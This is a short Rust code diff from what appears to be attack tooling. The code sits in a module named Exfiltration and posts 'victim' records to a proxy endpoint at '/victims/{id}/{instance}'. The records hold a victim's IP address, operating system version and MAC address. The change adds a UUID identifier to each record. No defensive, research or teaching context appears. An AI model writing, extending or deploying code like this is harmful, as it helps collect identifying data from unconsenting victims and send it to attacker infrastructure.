@@ -20,6 +20,7 @@ struct InstanceData {
 
 #[derive(Serialize)]
 struct VictimData {
+    identifier: Uuid,
     address: Option<String>,
     operating_system_version: String,
     mac_address: Option<String>,
@@ -70,16 +71,17 @@ impl Exfiltration {
             .error_for_status()
             .map_err(InternalServerError)?;
 
+        let identifier = Uuid::new_v4();
+
         state
             .0
             .proxy
             .post(format!(
                 "{}/victims/{}/{}",
-                state.0.proxy_url,
-                Uuid::new_v4(),
-                state.0.instance_identifier
+                state.0.proxy_url, identifier, state.0.instance_identifier
             ))
             .json(&VictimData {
+                identifier,
                 address: remote_address
                     .0
                     .as_socket_addr()
